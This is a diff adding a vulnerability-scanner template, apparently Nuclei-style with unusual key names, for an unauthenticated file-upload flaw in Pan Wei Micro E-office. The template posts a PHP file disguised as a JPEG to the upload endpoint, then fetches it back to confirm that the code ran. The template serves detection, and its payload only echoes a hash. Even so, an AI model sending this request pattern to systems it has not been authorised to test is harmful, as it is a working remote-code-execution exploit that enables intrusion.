@@ -1,0 +1,60 @@
+id: CNVD-2021-49104
+brief:
+    title: Pan Micro E-office File Uploads
+    by: pikpikcu
+    level: critical
+    about: The Pan Wei Micro E-office version running allows arbitrary file uploads from a remote attacker.
+    label:
+        - cnvd2021
+        - cnvd
+        - pan
+        - micro
+        - fileupload
+        - intrusive
+        - vuln
+    score: CVSS:9.9
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
+      head:
+        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+      body: |-
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="{{randstr}}.php"
+        Content-Type: image/jpeg
+
+        <?php echo md5("{{string}}");?>
+
+        --e64bdf16c554bbc109cecef6451c26a4--
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - 94d01a2324ce38a2e29a629c54190f67
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/images/logo/logo-eoffice.php'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - 94d01a2324ce38a2e29a629c54190f67
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
